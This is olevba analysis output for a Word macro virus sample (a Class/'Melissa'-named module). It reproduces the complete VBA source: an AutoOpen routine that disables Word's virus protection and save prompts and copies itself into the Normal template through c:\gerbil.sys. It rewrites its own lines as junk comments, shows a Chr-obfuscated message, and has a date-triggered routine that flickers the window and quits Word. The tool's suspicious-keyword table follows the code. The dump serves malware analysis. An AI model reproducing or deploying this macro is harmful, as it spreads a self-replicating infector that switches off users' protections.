olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fn-f0aae0ef52d2ab4d8ee2a13b2c780dbd21ca3072
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Melissa.cls 
in file: Virus.MSWord.Class.fn-f0aae0ef52d2ab4d8ee2a13b2c780dbd21ca3072 - OLE stream: 'Macros/VBA/Melissa'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
On Error GoTo 75
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
I = 0
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
Options.VirusProtection = False
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
Options.SaveNormalPrompt = False
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
Options.ConfirmConversions = False
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
If Day(13) And Month(11) Then Call ©
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
gx = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
xg = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
If xg > 94 And gx > 0 Then GoTo 75
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
If xg < 94 Then
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
 Set bg = NormalTemplate.VBProject.VBComponents.Item(1)
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
 ActiveDocument.VBProject.VBComponents.Item(1).Name = bg.Name
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
 ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\gerbil.sys"
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
End If
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
If gx = 0 Then Set bg = ActiveDocument.VBProject.VBComponents.Item(1)
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
 Infection = Int(Rnd * 50)
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
 If Infection = 49 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(71) + Chr(69) + Chr(82) + Chr(66) + Chr(73) + Chr(76) + Chr(32) + Chr(66) + Chr(121) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
 bg.codemodule.AddFromFile ("c:\gerbil.sys")
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
 With bg.codemodule
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
    For x = 1 To 4
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
    .deletelines 1
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
    Next x
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
 End With
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
 If xg < 94 Then
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
    With bg.codemodule
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
    .replaceline 1, "Sub AutoClose()"
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
    .replaceline 99, "Sub ToolsMacro()"
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
    rd = Int(Rnd * 100)
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
If rd = 99 Then .replaceline 69, ".replaceline x, ""'"" & Application.Version & Application.MathCoprocessorAvailable & Application.FocusInMailHeader & Application.ActiveWindow"
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
End With
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
 End If
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
 With bg.codemodule
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
    For x = 2 To 96 Step 2
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
    .replaceline x, "'" & Application.DisplayRecentFiles & Application.StartupPath & Application.ActiveDocument & Application.ActiveWindow
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
    Next x
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
 End With
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
75:
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
 If xg > 94 And gx = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
End Sub
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
Private Sub ©()
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
Top:
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
I = I + 1
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
On Error Resume Next
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
Application.WindowState = wdWindowStateMinimize
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
Application.WindowState = wdWindowStateMaximize
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
If I < 10 Then GoTo Top
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
Application.Quit
'Truec:\windows\application data\microsoft\word\startuptejas verdes.doctejas verdes
End Sub

Sub ViewVBCode()

End Sub





+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

